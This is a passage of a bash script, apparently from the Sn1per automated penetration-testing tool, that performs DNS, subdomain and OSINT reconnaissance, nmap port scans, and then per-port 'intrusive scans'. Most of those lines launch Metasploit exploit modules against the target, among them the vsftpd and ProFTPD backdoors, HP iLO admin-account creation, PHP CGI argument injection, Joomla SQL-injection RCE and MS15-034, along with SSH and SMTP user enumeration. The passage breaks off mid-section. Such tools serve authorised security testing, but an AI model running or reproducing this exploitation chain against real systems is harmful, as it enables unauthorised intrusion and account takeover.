# NORMAL SCAN #####################################################################################################
if [ "$REPORT" = "1" ]; then
  args="-t $TARGET"
  if [ "$OSINT" = "1" ]; then
    args="$args -o"
  fi
  if [ "$AUTOBRUTE" = "1" ]; then
    args="$args -b"
  fi
  if [ "$FULLNMAPSCAN" = "1" ]; then
    args="$args -fp"
  fi
  if [ "$RECON" = "1" ]; then
    args="$args -re"
  fi
  if [ "MODE" = "port" ]; then
    args="$args -m port"
  fi
  if [ ! -z "$PORT" ]; then
    args="$args -p $PORT"
  fi
  if [ ! -z "$WORKSPACE" ]; then
    args="$args -w $WORKSPACE"
  fi
  args="$args --noreport"
  echo "sniper -t $TARGET -m $MODE --noreport $args" >> $LOOT_DIR/scans/$TARGET-normal.txt
  sniper $args | tee $LOOT_DIR/output/sniper-$TARGET-`date +%Y%m%d%H%M`.txt 2>&1
  exit
fi

echo -e "$OKRED                ____               $RESET"
echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
echo -e "$OKRED               /_/                 $RESET"
echo -e "$RESET"
echo -e "$OKORANGE + -- --=[http://xerosecurity.com"
echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3"
echo -e "$RESET"

if [ ! -z $WORKSPACE ]; then
  LOOT_DIR=$WORKSPACE_DIR
fi

echo "$TARGET" >> $LOOT_DIR/domains/targets.txt

echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED GATHERING DNS INFO $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
dig all +short $TARGET > $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null
dig all +short -x $TARGET >> $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null
dnsenum $TARGET 2> /dev/null
mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null

if [ "$RECON" = "1" ]; then
  if [ $SCAN_TYPE == "DOMAIN" ];
  then
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED GATHERING WHOIS INFO $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    whois $TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED GATHERING DNS SUBDOMAINS VIA SUBLIST3R $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $PLUGINS_DIR/Sublist3r/sublist3r.py -d $TARGET -vvv -o $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
    if [ "$AMASS" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED GATHERING DNS SUBDOMAINS VIA AMASS $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      amass -whois -ip -brute -o $LOOT_DIR/domains/domains-$TARGET-amass.txt -min-for-recursive 3 -d $TARGET 2>/dev/null
      cut -d, -f1 $LOOT_DIR/domains/domains-$TARGET-amass.txt | grep $TARGET > $LOOT_DIR/domains/domains-$TARGET-amass-sorted.txt
      cut -d, -f2 $LOOT_DIR/domains/domains-$TARGET-amass.txt > $LOOT_DIR/domains/domains-$TARGET-amass-ips-sorted.txt
    fi

    if [ "$SUBFINDER" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED GATHERING DNS SUBDOMAINS VIA SUBFINDER $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      subfinder -o $LOOT_DIR/domains/domains-$TARGET-subfinder.txt -b -d $TARGET 2>/dev/null
    fi
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED BRUTE FORCING DNS SUBDOMAINS VIA DNSCAN (THIS COULD TAKE A WHILE...) $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    if [ "$DNSCAN" = "1" ]; then
      python /pentest/recon/dnscan/dnscan.py -d $TARGET -w $DOMAINS_FULL -o $LOOT_DIR/domains/domains-dnscan-$TARGET.txt -i $LOOT_DIR/domains/domains-$TARGET-ips.txt
      cat $LOOT_DIR/domains/domains-dnscan-$TARGET.txt | grep $TARGET | awk '{print $3}' | sort -u >> $LOOT_DIR/domains/domains-$TARGET.txt 2> /dev/null
      dos2unix $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
    fi
    echo ""
    if [ "$CRTSH" = "1" ]; then
      echo -e "$OKRED ╔═╗╦═╗╔╦╗╔═╗╦ ╦$RESET"
      echo -e "$OKRED ║  ╠╦╝ ║ ╚═╗╠═╣$RESET"
      echo -e "$OKRED ╚═╝╩╚═ ╩o╚═╝╩ ╩$RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED GATHERING CERTIFICATE SUBDOMAINS $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKBLUE"
      curl -s https://crt.sh/?q=%25.$TARGET > /tmp/curl.out && cat /tmp/curl.out | grep $TARGET | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u > $LOOT_DIR/domains/domains-$TARGET-crt.txt && cat $LOOT_DIR/domains/domains-$TARGET-crt.txt
      echo ""
      echo -e "${OKRED}[+] Domains saved to: $LOOT_DIR/domains/domains-$TARGET-full.txt"
    fi
    cat $LOOT_DIR/domains/domains-$TARGET-crt.txt > /tmp/curl.out 2> /dev/null
    cat $LOOT_DIR/domains/domains-$TARGET-amass-sorted.txt >> /tmp/curl.out 2> /dev/null
    cat $LOOT_DIR/domains/domains-$TARGET-subfinder.txt >> /tmp/curl.out 2> /dev/null
    cat $LOOT_DIR/domains/domains-$TARGET.txt >> /tmp/curl.out 2> /dev/null
    cat $LOOT_DIR/domains/targets.txt >> /tmp/curl.out 2> /dev/null
    sort -u /tmp/curl.out > $LOOT_DIR/domains/domains-$TARGET-full.txt
    rm -f /tmp/curl.out 2> /dev/null
    echo -e "$RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED CHECKING FOR SUBDOMAIN HIJACKING $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    dig $TARGET CNAME | egrep -i "wordpress|instapage|heroku|github|bitbucket|squarespace|fastly|feed|fresh|ghost|helpscout|helpjuice|instapage|pingdom|surveygizmo|teamwork|tictail|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign|monitor|cargocollective|statuspage|tumblr|amazon|hubspot|cloudfront|modulus|unbounce|uservoice|wpengine|cloudapp" | tee $LOOT_DIR/nmap/takeovers-$TARGET.txt 2>/dev/null
    for a in `cat $LOOT_DIR/domains/domains-$TARGET-full.txt`; do dig $a CNAME | egrep -i 'wordpress|instapage|heroku|github|bitbucket|squarespace|fastly|feed|fresh|ghost|helpscout|helpjuice|instapage|pingdom|surveygizmo|teamwork|tictail|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign|monitor|cargocollective|statuspage|tumblr|amazon|hubspot|cloudfront|modulus|unbounce|uservoice|wpengine|cloudapp' | tee $LOOT_DIR/nmap/takeovers-$a.txt 2>/dev/null; done;
    if [ "$SUBOVER" = "1" ]; then
      subover -l $LOOT_DIR/domains/domains-$TARGET-full.txt | tee $LOOT_DIR/nmap/takeovers-$TARGET-subover.txt 2>/dev/null
    fi
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED CHECKING FOR S3 PUBLIC BUCKETS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    if [ "$CLOUDHUNTER" = "1" ]; then
      cloudhunter -d $a | tee $LOOT_DIR/nmap/takeovers-$TARGET-aws.txt -v y 2>/dev/null
      cloudhunter -w $LOOT_DIR/domains/domains-$TARGET-full.txt | tee $LOOT_DIR/nmap/takeovers-$TARGET-aws-all.txt -v y 2>/dev/null
    fi
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED CHECKING EMAIL SECURITY $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $PLUGINS_DIR/spoofcheck/spoofcheck.py $TARGET | tee $LOOT_DIR/nmap/dns-$TARGET-email.txt 2>/dev/null
    echo ""
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED STARTING DOMAIN FLYOVER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    aquatone-discover -d $TARGET -t 100 --wordlist $PLUGINS_DIR/Sublist3r/subdomains.lst | tee $LOOT_DIR/nmap/aquatone-$TARGET-discover.txt 2>/dev/null
    aquatone-takeover -d $TARGET -t 100 | tee $LOOT_DIR/nmap/aquatone-$TARGET-aquatone.txt 2>/dev/null
    aquatone-scan -d $TARGET -t 100 -p80,443 | tee $LOOT_DIR/nmap/aquatone-$TARGET-ports.txt 2>/dev/null
    aquatone-gather -d $TARGET -t 100 | tee $LOOT_DIR/nmap/aquatone-$TARGET-gather.txt 2>/dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED STARTING PUBLIC S3 BUCKET SCAN $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    cd $PLUGINS_DIR/slurp/
    ./slurp-linux-amd64 domain --domain $TARGET
    cd $INSTALL_DIR
    echo ""
    if [ "$OSINT" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED GATHERING OSINT INFO $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      theharvester -d $TARGET -l 25 -b all 2> /dev/null
      metagoofil -d $TARGET -t doc,pdf,xls,csv,txt -l 25 -n 25 -o $LOOT_DIR/osint/ -f $LOOT_DIR/osint/$TARGET.html
    fi
  fi
fi
echo ""
echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED PINGING HOST $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
ping -c 1 $TARGET
echo ""
echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED RUNNING TCP PORT SCAN $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
if [ -z "$PORT" ]; then
  nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
elif [ "$MODE" == "web" ]; then
  nmap -sV -T5 -Pn -p 80,443  --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
else
  nmap -sS -T5 -Pn -p $PORT --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
fi
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING UDP PORT SCAN $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
if [ -z "$PORT" ]; then
  nmap -Pn -sU -T4 -p$DEFAULT_UDP_PORTS --open $TARGET -oX $LOOT_DIR/nmap/nmap-udp-$TARGET.xml
else
  nmap -Pn -sU -T4 -p$PORT --open $TARGET -oX $LOOT_DIR/nmap/nmap-udp-$TARGET.xml
fi

echo ""
echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED RUNNING INTRUSIVE SCANS $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
port_21=`grep 'portid="21"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_22=`grep 'portid="22"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_23=`grep 'portid="23"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_25=`grep 'portid="25"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_53=`grep 'portid="53"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_79=`grep 'portid="79"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_110=`grep 'portid="110"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_111=`grep 'portid="111"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_135=`grep 'portid="135"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_137=`grep 'portid="137"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_139=`grep 'portid="139"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_162=`grep 'portid="162"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_389=`grep 'portid="389"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_445=`grep 'portid="445"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_512=`grep 'portid="512"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_513=`grep 'portid="513"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_514=`grep 'portid="514"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_623=`grep 'portid="623"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_624=`grep 'portid="624"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_1099=`grep 'portid="1099"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_1524=`grep 'portid="1524"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_2049=`grep 'portid="2049"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_2121=`grep 'portid="2121"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3128=`grep 'portid="3128"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3310=`grep 'portid="3310"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3632=`grep 'portid="3632"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_4443=`grep 'portid="4443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5555=`grep 'portid="5555"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5800=`grep 'portid="5800"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5984=`grep 'portid="5984"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_7001=`grep 'portid="7001"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8009=`grep 'portid="8009"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8180=`grep 'portid="8180"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8443=`grep 'portid="8443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8888=`grep 'portid="8888"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_10000=`grep 'portid="10000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_16992=`grep 'portid="16992"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_27017=`grep 'portid="27017"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_27018=`grep 'portid="27018"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_27019=`grep 'portid="27019"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_28017=`grep 'portid="28017"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_49152=`grep 'portid="49152"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`

if [ "$FULLNMAPSCAN" = "1" ]; then
  port_67=`grep 'portid="67"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
  port_68=`grep 'portid="68"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
  port_69=`grep 'portid="69"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
  port_123=`grep 'portid="123"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
  port_161=`grep 'portid="161"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
fi

if [ -z "$port_21" ];
then
  echo -e "$OKRED + -- --=[Port 21 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 21 opened... running tests...$RESET"
  nmap -A -sV -Pn -sC -T5 -p 21 --script=ftp-* $TARGET
  msfconsole -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/ftp_version; run; use auxiliary/scanner/ftp/anonymous; run; use exploit/unix/ftp/vsftpd_234_backdoor; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
fi

if [ -z "$port_22" ];
then
  echo -e "$OKRED + -- --=[Port 22 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 22 opened... running tests...$RESET"
  if [ $DISTRO == "blackarch" ]; then
    /bin/ssh-audit $TARGET:22
    python $PLUGINS_DIR/ssh-enum/sshUsernameEnumExploit.py --port 22 --userList /usr/share/brutex/wordlists/simple-users.txt $TARGET | grep 'is a valid'
  else
    cd $PLUGINS_DIR/ssh-audit
    python ssh-audit.py $TARGET:22
    python $PLUGINS_DIR/ssh-enum/sshUsernameEnumExploit.py --port 22 --userList /usr/share/brutex/wordlists/simple-users.txt $TARGET | grep 'is a valid'
  fi
  cd $INSTALL_DIR
  nmap -A -sV -Pn -sC -T5 -p 22 --script=ssh-* $TARGET
  msfconsole -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use auxiliary/scanner/ssh/ssh_version; run; use scanner/ssh/ssh_enumusers; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"
fi

if [ -z "$port_23" ];
then
  echo -e "$OKRED + -- --=[Port 23 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 23 opened... running tests...$RESET"
  echo ""
  cisco-torch -A $TARGET
  nmap -A -sV -Pn -T5 --script=telnet* -p 23 $TARGET
  msfconsole -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"
fi

if [ -z "$port_25" ];
then
  echo -e "$OKRED + -- --=[Port 25 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 25 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=smtp* -p 25 $TARGET
  smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
  msfconsole -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;"
fi

if [ -z "$port_53" ];
then
  echo -e "$OKRED + -- --=[Port 53 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 53 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=dns* -p 53 $TARGET
fi

if [ -z "$port_67" ];
then
  echo -e "$OKRED + -- --=[Port 67 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 67 opened... running tests...$RESET"
  nmap -A -sU -sV -Pn -T5 --script=dhcp* -p 67 $TARGET
fi

if [ -z "$port_68" ];
then
  echo -e "$OKRED + -- --=[Port 68 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 68 opened... running tests...$RESET"
  nmap -A -sU -sV -Pn -T5 --script=dhcp* -p 68 $TARGET
fi

if [ -z "$port_69" ];
then
  echo -e "$OKRED + -- --=[Port 69 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 69 opened... running tests...$RESET"
  nmap -A -sU -sV -Pn -T5 --script=tftp* -p 69 $TARGET
fi

if [ -z "$port_79" ];
then
  echo -e "$OKRED + -- --=[Port 79 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 79 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=finger* -p 79 $TARGET
  bin/fingertool.sh $TARGET $USER_FILE
fi

if [ -z "$port_80" ];
then
  echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED CHECKING FOR WAF $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  wafw00f http://$TARGET | tee $LOOT_DIR/web/waf-$TARGET-http 2> /dev/null
  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/waf-$TARGET-http > $LOOT_DIR/web/waf-$TARGET-http.txt 2> /dev/null
  echo ""
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED GATHERING HTTP INFO $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  whatweb -a 3 http://$TARGET | tee $LOOT_DIR/web/whatweb-$TARGET-http  2> /dev/null
  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/whatweb-$TARGET-http > $LOOT_DIR/web/whatweb-$TARGET-http.txt 2> /dev/null
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED GATHERING SERVER INFO $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  python3 $PLUGINS_DIR/wig/wig.py -d -q -t 50 http://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-http
  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-http > $LOOT_DIR/web/wig-$TARGET-http.txt 2> /dev/null
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED CHECKING HTTP HEADERS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  wget -qO- -T 1 --connect-timeout=3 --read-timeout=3 --tries=1 http://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-http-$TARGET.txt 2> /dev/null
  curl --connect-timeout 3 -I -s -R http://$TARGET | tee $LOOT_DIR/web/headers-http-$TARGET.txt 2> /dev/null
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED SAVING SCREENSHOTS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port80.jpg"
  if [ ${DISTRO} == "blackarch"  ]; then
    /bin/CutyCapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg --insecure --max-wait=1000 2> /dev/null
  else
    cutycapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg --insecure --max-wait=1000 2> /dev/null
  fi
  if [ "$MODE" = "web" ];
  then
    if [ "$PASSIVE_SPIDER" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING PASSIVE WEB SPIDER $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      curl -sX GET "http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.$TARGET&output=json" | jq -r .url | sort -u | tee $LOOT_DIR/web/spider-$TARGET.txt 2> /dev/null
    fi

    if [ "$BLACKWIDOW" == "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING ACTIVE WEB SPIDER & APPLICATION SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      blackwidow -u http://$TARGET -l 3 -s y -v y
      cat /usr/share/blackwidow/$TARGET/$TARGET-urls-sorted.txt >> $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
    fi
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING FILE/DIRECTORY BRUTE FORCE $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u http://$TARGET -w $WEB_BRUTE_INSANE -x 400,403,404,405,406,429,502,503,504 -F -e php,asp,aspx,bak,zip,tar.gz,html,htm 
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* 2> /dev/null
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* > $LOOT_DIR/web/dirsearch-$TARGET.txt 2> /dev/null
    wget http://$TARGET/robots.txt -O $LOOT_DIR/web/robots-$TARGET-http.txt 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP HTTP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -Pn -T5 -p 80 -sV --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-vuln* $TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    clusterd -i $TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    wpscan --url http://$TARGET --batch --disable-tls-checks
    echo ""
    wpscan --url http://$TARGET/wordpress/ --batch --disable-tls-checks
    echo ""
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING CMSMAP $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $CMSMAP -t http://$TARGET
    echo ""
    python $CMSMAP -t http://$TARGET/wordpress/
    echo ""
    if [ "$NIKTO" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING WEB VULNERABILITY SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      nikto -h http://$TARGET -output $LOOT_DIR/web/nikto-$TARGET-http.txt
    fi

    cd $INSTALL_DIR
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "80"; setg SSL false; run; use scanner/http/webdav_website_content; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$TARGET\"; set RPORT 80; set WAIT 2; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$TARGET\"; set RPORT 80; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST \"$TARGET\"; set RPORT 80; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST \"$TARGET\"; set RPORT 80; set SSL false; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
